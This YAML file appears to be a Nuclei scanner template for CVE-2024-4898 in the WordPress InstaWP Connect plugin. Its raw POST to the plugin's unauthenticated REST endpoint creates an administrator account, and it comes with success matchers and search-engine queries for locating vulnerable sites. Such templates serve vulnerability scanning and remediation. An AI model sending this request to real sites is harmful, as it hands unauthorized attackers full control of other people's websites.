http:
- matchers:
  - condition: and
    type: word
    words:
    - '"status":true'
    - '"connect_id":'
    - '"message":"Connected"'
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - "POST /wp-json/instawp-connect/v1/config HTTP/1.1\nHost: {{Hostname}}\nContent-Type:\
    \ application/json\n\n{\n  \"api_key\": \"{{api_key}}\",\n  \"wp\": {\n    \"\
    users\": [\n      {\n        \"username\": \"{{username}}\",\n        \"email\"\
    : \"{{email}}\",\n        \"password\": \"{{password}}\"\n      }\n    ]\n  }\n\
    }\n"
id: CVE-2024-4898
info:
  author: Sourabh-Sahu
  classification:
    cpe: cpe:2.3:a:instawp:instawp_connect:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-4898
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-862
    epss-percentile: 0.99472
    epss-score: 0.88481
  description: "The InstaWP Connect \u2013 1-click WP Staging & Migration plugin for\
    \ WordPress is vulnerable to arbitrary option updates due to a missing authorization\
    \ checks on the REST API calls in all versions up to, and including, 0.1.0.38.\
    \ This makes it possible for unauthenticated attackers to connect the site to\
    \ InstaWP API, edit arbitrary site options and create administrator accounts.\n"
  impact: 'Unauthenticated attackers can create administrator accounts and modify
    site options, leading to complete site takeover.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/instawp-connect/"
    framework: wordpress
    product: instawp_connect
    publicwww-query: /wp-content/plugins/instawp-connect/
    vendor: instawp
  name: WordPress InstaWP Connect <= 0.1.0.38 - Unauthenticated User Creation
  reference:
  - https://www.wordfence.com/threat-intel/vulnerabilities/id/92a00fb4-7b50-43fd-ac04-5d6e29336e9c?source=cve
  - https://plugins.trac.wordpress.org/browser/instawp-connect/tags/0.1.0.38/includes/class-instawp-rest-api.php#L926
  - https://nvd.nist.gov/vuln/detail/CVE-2024-4898
  - https://github.com/truonghuuphuc/CVE-2024-4898-Poc
  remediation: 'Update InstaWP Connect to version 0.1.0.39 or later, which patches
    this vulnerability.

    '
  severity: critical
  tags: cve,cve2024,wp,wp-plugin,wordpress,instawp,intrusive,priv-esc,vkev,vuln
variables:
  api_key: '{{api_key}}'
  email: '{{randstr}}@{{rand_base(5)}}.com'
  password: '{{rand_base(8)}}'
  username: '{{rand_base(6)}}'
